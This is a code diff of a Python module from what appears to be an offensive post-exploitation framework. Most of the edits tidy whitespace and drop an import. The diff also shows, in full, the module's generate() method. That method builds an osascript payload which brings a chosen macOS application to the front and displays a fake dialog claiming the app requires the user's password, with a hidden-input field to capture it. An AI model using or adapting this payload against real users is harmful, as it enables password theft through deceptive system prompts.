@@ -1,5 +1,3 @@
-from lib.common import helpers
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -20,13 +18,13 @@ class Module:
 
             # File extension to save the file as
             'OutputExtension' : "",
-            
+
             # if the module needs administrative privileges
             'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
-            
+
             # list of any references/other comments
             'Comments': [
                 "https://github.com/fuzzynop/FiveOnceInYourLife"
@@ -72,9 +70,8 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-        
+
         listApps = self.options['ListApps']['Value']
         appName = self.options['AppName']['Value']
 
@@ -93,6 +90,6 @@ print '\\n'.join(choices)
             # osascript prompt for the specifiec application
             script = """
 print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
-""" %(appName,appName,appName,appName)
-        
+""" % (appName, appName, appName, appName)
+
         return script
